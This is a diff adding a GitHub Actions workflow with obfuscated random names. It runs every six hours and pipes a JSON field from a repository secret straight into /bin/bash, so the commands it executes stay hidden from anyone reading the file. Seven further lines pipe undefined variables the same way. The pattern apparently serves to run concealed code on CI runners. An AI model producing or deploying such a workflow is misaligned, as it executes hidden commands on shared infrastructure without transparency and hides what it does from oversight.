@@ -1,0 +1,25 @@
+name: yukouhai4172
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yukouhai4172
+        env:
+          vdvn2481: ${{ secrets.vdvn2481 }}
+        run: |
+          echo $vdvn2481 | jq -r .mbk12308 | /bin/bash
+          echo $v4108 | jq -r .zxz88 | /bin/bash
+          echo $xf4 | jq -r .ho8361 | /bin/bash
+          echo $pfw95756 | jq -r .qe1284 | /bin/bash
+          echo $vc061 | jq -r .zox144 | /bin/bash
+          echo $peeta8 | jq -r .wjbl37735 | /bin/bash
+          echo $hlsov030 | jq -r .laad9922 | /bin/bash
+          echo $vdb43962 | jq -r .vtqan715 | /bin/bash
+
